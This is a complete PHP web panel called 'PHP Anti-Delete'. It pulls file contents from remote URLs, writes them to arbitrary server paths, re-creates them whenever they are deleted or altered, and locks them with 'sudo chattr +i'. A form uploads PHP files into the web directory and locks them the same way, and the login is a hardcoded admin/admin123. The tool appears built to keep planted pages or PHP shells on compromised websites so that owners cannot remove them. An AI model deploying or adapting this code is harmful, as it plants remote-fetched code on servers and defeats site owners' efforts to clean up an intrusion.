<?php
session_start();

// Configuration
define('LOG_FILE', 'antidelete.log');
define('BG_IMAGE', 'https://i.pinimg.com/originals/28/d9/a5/28d9a5107af5d4c4da117c05b4393b83.gif');
$users = ['admin' => password_hash('admin123', PASSWORD_DEFAULT)]; // Change for production!

// Handle theme preference
if (isset($_GET['theme'])) {
    $_SESSION['theme'] = $_GET['theme'] === 'dark' ? 'dark' : 'light';
}

$current_theme = $_SESSION['theme'] ?? 'light';

// Protection functions
function protect_file($path) {
    if (!file_exists($path)) return false;
    
    @chmod($path, 0400);
    if (function_exists('exec')) {
        @exec("sudo chattr +i " . escapeshellarg($path) . " 2>&1", $output, $return);
    }
    return true;
}

function unprotect_file($path) {
    if (!file_exists($path)) return false;
    
    if (function_exists('exec')) {
        @exec("sudo chattr -i " . escapeshellarg($path) . " 2>&1", $output, $return);
    }
    @chmod($path, 0644);
    return true;
}

// Core functions
function log_action($message) {
    file_put_contents(LOG_FILE, date('[Y-m-d H:i:s] ') . $message . PHP_EOL, FILE_APPEND);
}

function get_remote_content($url) {
    $content = false;
    
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
        $content = curl_exec($ch);
        curl_close($ch);
    } 
    elseif (ini_get('allow_url_fopen')) {
        $content = @file_get_contents($url);
    }
    
    return $content !== false ? $content : false;
}

function restore_file($path, $url) {
    $content = get_remote_content($url);
    if ($content === false) {
        log_action("Failed to fetch content from $url");
        return false;
    }
    
    $dir = dirname($path);
    if (!file_exists($dir)) {
        mkdir($dir, 0755, true);
        log_action("Created directory $dir");
    }
    
    if (file_exists($path)) {
        unprotect_file($path);
    }
    
    file_put_contents($path, $content);
    protect_file($path);
    
    log_action("Restored file $path from $url");
    return true;
}

function check_and_restore($path, $url) {
    if (!file_exists($path) || filesize($path) == 0) {
        return restore_file($path, $url);
    }
    
    $current_content = file_get_contents($path);
    $expected_content = get_remote_content($url);
    
    if ($expected_content === false) {
        log_action("Failed to verify content from $url");
        return false;
    }
    
    if ($current_content !== $expected_content) {
        return restore_file($path, $url);
    }
    
    if (is_writable($path)) {
        protect_file($path);
    }
    
    return true;
}

// Authentication
if (isset($_POST['login'])) {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    
    if (isset($users[$username]) && password_verify($password, $users[$username])) {
        $_SESSION['logged_in'] = true;
        $_SESSION['username'] = $username;
        header('Location: '.$_SERVER['PHP_SELF']);
        exit;
    } else {
        $login_error = "Invalid username or password";
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: '.$_SERVER['PHP_SELF']);
    exit;
}

// Anti-delete management
if (isset($_POST['add_antidelete']) && ($_SESSION['logged_in'] ?? false)) {
    $file_path = $_POST['file_path'];
    $file_url = $_POST['file_url'];
    
    if (!empty($file_path) && !empty($file_url)) {
        $config = json_decode(@file_get_contents('config.json'), true) ?: [];
        $config[] = ['path' => $file_path, 'url' => $file_url, 'active' => true];
        file_put_contents('config.json', json_encode($config));
        
        check_and_restore($file_path, $file_url);
        $success_message = "Added protection for $file_path";
    } else {
        $error_message = "Both file path and URL are required";
    }
}

// File upload
if (isset($_FILES['php_file']) && ($_SESSION['logged_in'] ?? false)) {
    $upload_dir = 'uploads/';
    if (!file_exists($upload_dir)) {
        mkdir($upload_dir, 0755, true);
    }
    
    $file_name = basename($_FILES['php_file']['name']);
    $target_file = $upload_dir . $file_name;
    
    if (move_uploaded_file($_FILES['php_file']['tmp_name'], $target_file)) {
        protect_file($target_file);
        $upload_success = "File $file_name uploaded and protected";
    } else {
        $upload_error = "File upload failed";
    }
}

// Toggle protection
if (isset($_GET['toggle']) && isset($_GET['id']) && ($_SESSION['logged_in'] ?? false)) {
    $id = (int)$_GET['id'];
    $config = json_decode(@file_get_contents('config.json'), true) ?: [];
    if (isset($config[$id])) {
        $config[$id]['active'] = !$config[$id]['active'];
        file_put_contents('config.json', json_encode($config));
        
        if ($config[$id]['active']) {
            check_and_restore($config[$id]['path'], $config[$id]['url']);
        } else {
            unprotect_file($config[$id]['path']);
        }
    }
    header('Location: '.$_SERVER['PHP_SELF']);
    exit;
}

// Background restoration
if ($_SESSION['logged_in'] ?? false) {
    if (file_exists('config.json')) {
        $config = json_decode(file_get_contents('config.json'), true) ?: [];
        foreach ($config as $item) {
            if ($item['active']) {
                check_and_restore($item['path'], $item['url']);
            }
        }
    }
}

$config = file_exists('config.json') ? json_decode(file_get_contents('config.json'), true) : [];
?>
<!DOCTYPE html>
<html lang="en" data-theme="<?= $current_theme ?>">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP Anti-Delete</title>
    <style>
        :root {
            --primary: #3498db;
            --secondary: #2c3e50;
            --success: #2ecc71;
            --danger: #e74c3c;
            --warning: #f39c12;
            --info: #1abc9c;
        }
        
        [data-theme="light"] {
            --bg-color: #f5f5f5;
            --text-color: #333;
            --card-bg: #ffffff;
            --border-color: #ddd;
            --header-bg: var(--secondary);
            --header-text: #ffffff;
            --table-header: #f8f9fa;
            --table-border: #ddd;
            --input-bg: #ffffff;
            --input-border: #ddd;
            --log-bg: #f8f9fa;
        }
        
        [data-theme="dark"] {
            --bg-color: #121212;
            --text-color: #e0e0e0;
            --card-bg: #1e1e1e;
            --border-color: #333;
            --header-bg: #0d0d0d;
            --header-text: #ffffff;
            --table-header: #2d2d2d;
            --table-border: #333;
            --input-bg: #2d2d2d;
            --input-border: #444;
            --log-bg: #2d2d2d;
        }
        
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            background-color: var(--bg-color);
            color: var(--text-color);
            transition: all 0.3s ease;
        }
        
        .login-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('<?= BG_IMAGE ?>') center/cover no-repeat;
            z-index: -1;
            opacity: 0.8;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .header {
            background-color: var(--header-bg);
            color: var(--header-text);
            padding: 20px 0;
            margin-bottom: 30px;
            border-radius: 5px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .header h1 {
            margin: 0;
            padding: 0 20px;
            font-size: 1.8rem;
        }
        
        .card {
            background: var(--card-bg);
            border-radius: 5px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            padding: 20px;
            margin-bottom: 20px;
            border: 1px solid var(--border-color);
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        
        input[type="text"], 
        input[type="password"], 
        input[type="file"],
        select, textarea {
            width: 100%;
            padding: 10px;
            background-color: var(--input-bg);
            color: var(--text-color);
            border: 1px solid var(--input-border);
            border-radius: 4px;
            font-family: inherit;
            font-size: 1rem;
            transition: all 0.3s;
        }
        
        button, .btn {
            background-color: var(--primary);
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 4px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            font-size: 1rem;
            transition: background-color 0.3s;
        }
        
        button:hover, .btn:hover {
            opacity: 0.9;
        }
        
        .btn-danger {
            background-color: var(--danger);
        }
        
        .btn-danger:hover {
            background-color: #c0392b;
        }
        
        .btn-success {
            background-color: var(--success);
        }
        
        .btn-warning {
            background-color: var(--warning);
        }
        
        .btn-info {
            background-color: var(--info);
        }
        
        .alert {
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 4px;
            border-left: 4px solid transparent;
        }
        
        .alert-success {
            background-color: rgba(46, 204, 113, 0.2);
            border-left-color: var(--success);
        }
        
        .alert-error {
            background-color: rgba(231, 76, 60, 0.2);
            border-left-color: var(--danger);
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            margin-bottom: 20px;
        }
        
        th, td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid var(--table-border);
        }
        
        th {
            background-color: var(--table-header);
            font-weight: 600;
        }
        
        .status-active {
            color: var(--success);
            font-weight: bold;
        }
        
        .status-inactive {
            color: var(--danger);
            font-weight: bold;
        }
        
        .login-container {
            max-width: 400px;
            margin: 100px auto;
            background: rgba(30, 30, 30, 0.9);
            backdrop-filter: blur(5px);
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        }
        
        .login-header {
            background-color: var(--secondary);
            color: white;
            padding: 20px;
            text-align: center;
        }
        
        .login-body {
            padding: 20px;
        }
        
        .theme-switcher {
            margin-left: 15px;
            cursor: pointer;
            padding: 5px 10px;
            border-radius: 4px;
            background-color: var(--primary);
            color: white;
            font-size: 0.9rem;
        }
        
        .footer {
            text-align: center;
            margin-top: 30px;
            padding: 20px;
            color: var(--text-color);
            font-size: 0.9rem;
        }
        
        .footer a {
            color: var(--primary);
            text-decoration: none;
        }
        
        @media (max-width: 768px) {
            .container {
                padding: 10px;
            }
            
            .header {
                flex-direction: column;
                text-align: center;
                padding: 15px 0;
            }
            
            .header-actions {
                margin-top: 10px;
            }
            
            table {
                display: block;
                overflow-x: auto;
            }
            
            .login-container {
                margin: 50px 15px;
                width: auto;
            }
        }
    </style>
</head>
<body>
    <?php if (!isset($_SESSION['logged_in'])): ?>
        <div class="login-bg"></div>
        <div class="login-container">
            <div class="login-header">
                <h2>PHP Anti-Delete</h2>
            </div>
            <div class="login-body">
                <?php if (isset($login_error)): ?>
                    <div class="alert alert-error"><?= htmlspecialchars($login_error) ?></div>
                <?php endif; ?>
                <form method="post">
                    <div class="form-group">
                        <label for="username">Username</label>
                        <input type="text" id="username" name="username" required>
                    </div>
                    <div class="form-group">
                        <label for="password">Password</label>
                        <input type="password" id="password" name="password" required>
                    </div>
                    <button type="submit" name="login" class="btn-success" style="width: 100%;">Login</button>
                </form>
            </div>
        </div>
    <?php else: ?>
        <div class="container">
            <div class="header">
                <h1>PHP Anti-Delete</h1>
                <div class="header-actions">
                    <a href="?theme=<?= $current_theme === 'dark' ? 'light' : 'dark' ?>" class="theme-switcher">
                        <?= $current_theme === 'dark' ? '☀️ Light Mode' : '🌙 Dark Mode' ?>
                    </a>
                    <a href="?logout=1" class="btn btn-danger">Logout (<?= htmlspecialchars($_SESSION['username']) ?>)</a>
                </div>
            </div>
            
            <?php if (isset($success_message)): ?>
                <div class="alert alert-success"><?= htmlspecialchars($success_message) ?></div>
            <?php endif; ?>
            
            <?php if (isset($error_message)): ?>
                <div class="alert alert-error"><?= htmlspecialchars($error_message) ?></div>
            <?php endif; ?>
            
            <div class="card">
                <h2>Add Anti-Delete Protection</h2>
                <form method="post">
                    <div class="form-group">
                        <label for="file_path">File Path (e.g., /var/www/html/file.txt)</label>
                        <input type="text" id="file_path" name="file_path" required>
                    </div>
                    <div class="form-group">
                        <label for="file_url">Content URL (e.g., https://web.com/LP.txt)</label>
                        <input type="text" id="file_url" name="file_url" required>
                    </div>
                    <button type="submit" name="add_antidelete" class="btn-success">Add Protection</button>
                </form>
            </div>
            
            <div class="card">
                <h2>Upload PHP File</h2>
                <?php if (isset($upload_success)): ?>
                    <div class="alert alert-success"><?= htmlspecialchars($upload_success) ?></div>
                <?php elseif (isset($upload_error)): ?>
                    <div class="alert alert-error"><?= htmlspecialchars($upload_error) ?></div>
                <?php endif; ?>
                <form method="post" enctype="multipart/form-data">
                    <div class="form-group">
                        <label for="php_file">Select PHP File:</label>
                        <input type="file" id="php_file" name="php_file" accept=".php" required>
                    </div>
                    <button type="submit" class="btn-success">Upload & Protect</button>
                </form>
            </div>
            
            <div class="card">
                <h2>Active Protections</h2>
                <?php if (empty($config)): ?>
                    <p>No active protections found.</p>
                <?php else: ?>
                    <table>
                        <thead>
                            <tr>
                                <th>File Path</th>
                                <th>Source URL</th>
                                <th>Status</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach ($config as $id => $item): ?>
                                <tr>
                                    <td><?= htmlspecialchars($item['path']) ?></td>
                                    <td><?= htmlspecialchars($item['url']) ?></td>
                                    <td>
                                        <span class="status-<?= $item['active'] ? 'active' : 'inactive' ?>">
                                            <?= $item['active'] ? 'ACTIVE' : 'INACTIVE' ?>
                                        </span>
                                    </td>
                                    <td>
                                        <a href="?toggle=1&id=<?= $id ?>" class="btn">
                                            <?= $item['active'] ? 'Deactivate' : 'Activate' ?>
                                        </a>
                                    </td>
                                </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                <?php endif; ?>
            </div>
            
            <div class="card">
                <h2>System Log</h2>
                <pre style="max-height: 300px; overflow-y: auto; background: var(--log-bg); padding: 10px; border-radius: 4px;">
                    <?= file_exists(LOG_FILE) ? htmlspecialchars(file_get_contents(LOG_FILE)) : 'Log file is empty' ?>
                </pre>
            </div>
            
            <div class="footer">
                <p>Copyright &copy; <?= date('Y') ?> by null7 | Contact: <a href="mailto:null7ganteng@gmail.com">null7ganteng@gmail.com</a></p>
            </div>
        </div>
    <?php endif; ?>
    
    <script>
        // Apply theme preference immediately
        document.documentElement.setAttribute('data-theme', '<?= $current_theme ?>');
        
        // Mobile menu and responsive adjustments can be added here if needed
    </script>
</body>
</html>